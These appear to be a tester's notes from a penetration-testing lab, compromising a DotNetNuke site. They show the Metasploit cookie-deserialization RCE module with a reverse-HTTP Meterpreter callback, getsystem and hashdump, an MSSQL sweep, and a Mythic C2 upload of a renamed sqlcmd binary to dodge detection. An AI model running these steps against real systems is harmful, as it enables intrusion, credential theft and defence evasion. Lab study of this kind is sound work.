Website is running DNN (dotnetnuke)
![[Pasted image 20250501120838.png]]

Potentially version 7.0
![[Pasted image 20250501121056.png]]

Registering a user tells us that the site admin has to verify and view our request.

Weak version of DNN, maybe google and look for an RCE?
No luck with a dnn cookie deserialization rce
![[Pasted image 20250501122524.png]]

It looks vulnerable, helpful blogpost?

Need to change the payload to  

```bash
msfconsole -q
use windows/http/dnn_cookie_deserialization_rce
set lhost tun0
set rhosts 10.10.110.10
set payload payload/windows/meterpreter/reverse_http
# In meterpreter
getsystem
# Might need to repeat it a second time
getsystem
# Use privileged meterpreter to run privileged beacon
```
We should be aware of Firewalls. Reverse http is very good at getting around these.
We can use meterpreter getsystem to privesc, and then hashdump to get some hashes,

We'll find the first flag in the DotNetNukedirectory

Checking the running processes, we see some SQL stuff running. We can use nmap, netexec, bloodhound to figure out the names of the servers.

Using netexec, we can check for anything in the domain running MSSQL
```bash
netexec mssql 10.9.20.13/24 -u '' -p ''
```
![[Pasted image 20250528223400.png]]

Through the binaries, it's sort of implied that we have permissions to this SQL server. 

We need to use sqlcmd
https://github.com/microsoft/go-sqlcmd/releases/tag/v1.8.2
```bash
wget https://github.com/microsoft/go-sqlcmd/releases/download/v1.8.2/sqlcmd-windows-amd64.zip
unzip sqlcmd-windows-amd64.zip
```

We can upload this using our Mythic C2.

```mythic
upload
```

And then run it. We're using the shell command in Mythic C2, and then passing everything after that as an arguement
```
shell C:\windows\tasks\sqlcmd.exe -S tcp:10.9.20.11,1433 -Q "select @@ version;"
```
It doesn't seem to like the name 'sqlcmd.exe', so we'll rename it.
![[Pasted image 20250528224341.png]]

```
shell C:\windows\tasks\update64.exe -S tcp:10.9.20.11,1433 -Q "select @@ version;"
```

That doesn't work. We have to used the referenced hostname
```
shell C:\windows\tasks\update64.exe -S CYWEBDW -Q "EXECUTE('SELECT name FROM master.dbo.sysdatabases') AT[m3sqlw.m3c.local];"
```
